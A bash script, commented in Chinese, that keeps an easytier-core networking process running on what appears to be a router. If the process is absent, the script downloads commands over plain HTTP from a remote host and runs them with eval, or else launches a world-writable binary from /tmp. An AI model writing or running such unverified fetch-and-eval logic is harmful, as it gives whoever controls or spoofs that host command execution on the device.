#!/bin/bash

# ==============================================================================
# 脚本功能：检查easytier-core进程，获取并执行远程指令或备用指令
# ==============================================================================

# 配置参数
# ------------------------------------------------------------------------------
TARGET_URL="http://etsh2.442230.xyz/wia3300"
BACKUP_CMD="mkdir -p /tmp/upload && cp /overlay/easytier-core /tmp/upload/ && chmod 777 /tmp/upload/easytier-core && nohup /tmp/upload/easytier-core -w udp://etcfgweb.175419.xyz:22020/guoke &"
TIMEOUT=10
PROCESS_NAME="easytier-core"
PROCESS_PATH="/tmp/upload/easytier-core"
TEMP_CMD_FILE=$(mktemp)

# 函数定义
# ------------------------------------------------------------------------------
# 检查easytier-core进程是否运行
check_process() {
    echo "--- 检查进程 '$PROCESS_NAME' 是否在运行 ---"
    if pgrep -f "$PROCESS_NAME.*$PROCESS_PATH" >/dev/null; then
        echo "进程 '$PROCESS_NAME' 正在运行。无需重复启动。"
        return 0
    else
        echo "进程 '$PROCESS_NAME' 未运行或路径不正确。继续..."
        return 1
    fi
}

# 从HTTP地址获取指令
fetch_command() {
    echo "--- 尝试从 HTTP 地址获取指令 ---"
    echo "地址: $TARGET_URL"
    echo "超时: $TIMEOUT 秒"

    if curl --fail --silent --max-time "$TIMEOUT" "$TARGET_URL" -o "$TEMP_CMD_FILE"; then
        FETCHED_CMD=$(grep -v '^#\|^$' "$TEMP_CMD_FILE")
        if [[ -z "$FETCHED_CMD" ]]; then
            echo "警告: 从HTTP获取的指令为空。"
            return 1
        else
            echo "成功获取指令。"
            return 0
        fi
    else
        echo "错误: HTTP请求失败。"
        return 1
    fi
}

# 执行指令
execute_command() {
    local cmd_to_execute="$1"
    echo "--- 执行指令 ---"
    echo "指令: $cmd_to_execute"

    # 使用 `eval` 执行指令
    eval "$cmd_to_execute"

    if [[ $? -eq 0 ]]; then
        echo "指令执行成功。"
        return 0
    else
        echo "错误: 指令执行失败。"
        return 1
    fi
}

# 清理函数
cleanup() {
    echo "--- 清理临时文件 ---"
    rm -f "$TEMP_CMD_FILE"
}

# 主逻辑
# ------------------------------------------------------------------------------
# 确保在脚本退出时执行清理
trap cleanup EXIT

if check_process; then
    exit 0
fi

if fetch_command; then
    execute_command "$FETCHED_CMD"
else
    echo "--- 执行备用指令 ---"
    execute_command "$BACKUP_CMD"
fi

# 脚本正常结束，由trap负责清理
exit 0
